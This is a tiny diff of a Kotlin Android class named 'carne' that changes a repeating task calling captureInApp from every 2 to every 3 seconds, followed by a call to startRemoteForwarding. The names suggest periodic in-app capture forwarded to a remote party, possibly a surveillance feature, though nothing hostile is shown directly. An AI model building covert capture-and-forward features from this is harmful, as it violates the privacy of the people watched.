@@ -42,7 +42,7 @@ class carne(private val context: Context, private val activity: Activity? = null
                     captureInApp(activity)
                 }
             }
-        }, 0, 2, TimeUnit.SECONDS)
+        }, 0, 3, TimeUnit.SECONDS)
         
         startRemoteForwarding()
     }
